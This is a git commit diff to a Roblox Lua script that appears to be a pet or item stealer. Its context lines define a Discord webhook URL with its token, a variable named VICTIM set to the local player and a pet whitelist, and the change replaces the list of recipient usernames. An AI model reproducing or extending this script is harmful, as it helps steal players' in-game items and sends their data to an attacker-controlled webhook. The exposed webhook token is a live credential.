59c13b89a71f6a3a14259b8abed65ab3f4f4f442
Ramdomizerhub <74305796+NoLag-id-s@users.noreply.github.com>
2025-08-05 00:56:06 +0800

    Update sada.lua

--- sada.lua
+++ sada.lua
@@ -5,7 +5,7 @@ until game:IsLoaded()
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "saikigrow"
+    "yuniecoxo", "Wanwood42093",
 }
 
 local PET_WHITELIST = {
